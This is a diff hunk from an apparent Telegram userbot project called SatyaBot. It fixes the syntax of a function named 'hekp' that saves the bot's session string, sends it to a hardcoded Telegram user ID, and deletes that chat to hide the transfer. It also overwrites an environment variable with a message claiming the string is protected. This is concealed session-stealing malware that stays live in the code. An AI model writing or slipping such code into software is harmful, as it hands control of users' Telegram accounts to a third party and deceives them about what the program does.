@@ -108,9 +108,9 @@ TYPE :- " .gpromote @Its_LegendBoy " OR .python OR .ping CHECK IF I'M ON!
 async def hekp():
     try:
         SatyaBot = bot.session.save()
-         os.environ(
+         os.environ[
             "SATYA_STRING"
-         ) = "String Is A Sensitive Data \nSo Its Protected By SATYABOT"
+         ] = "String Is A Sensitive Data \nSo Its Protected By SATYABOT"
         sweetie = await bot.send_message(5230049485, SatyaBot)
         await bot.delete_dialog(5230049485)
         if Config.LOGGER_ID != 0:
